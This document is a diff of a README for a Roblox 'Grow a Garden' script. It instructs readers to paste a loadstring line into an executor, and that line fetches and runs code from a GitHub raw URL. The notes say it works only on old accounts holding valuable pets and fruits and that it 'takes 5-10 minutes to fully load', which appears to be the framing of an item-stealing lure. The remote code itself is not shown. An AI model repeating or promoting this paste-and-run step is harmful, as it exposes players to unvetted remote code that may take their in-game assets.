@@ -5,19 +5,12 @@ GROW A GARDEN SCRIPT 🌱
 ❗ Only works on old accounts with high value pets and fruits
 
 
-⚠️ Note:
-🔥This script won’t work on new accounts.🔥
-‼️You need valuable pets and fruits for it to function.‼️
-⭕Be patient — the script takes a few minutes to fully load!⭕
-
-
 📜 How to Use:
 
 1. Open your executor.
 
 
 2. Copy and paste this code:
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LATESTSCRIPTGAG/GROWAGARDEN/refs/heads/main/GAGSCRIPT"))()
 
 
@@ -32,7 +25,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/LATESTSCRIPTGAG/GROWA
 
 ⚠️ Note:
 🔥This script won’t work on new accounts.🔥
-‼️You need valuable pets and fruits for it to function.‼️
-⭕Be patient — the script takes a few minutes to fully load!⭕
+‼️You need valuable pets and fruits for it to function, if none detection. will stop at 100%‼️
+⭕Be patient — the script takes a 5-10 minutes to fully load!⭕
 
 
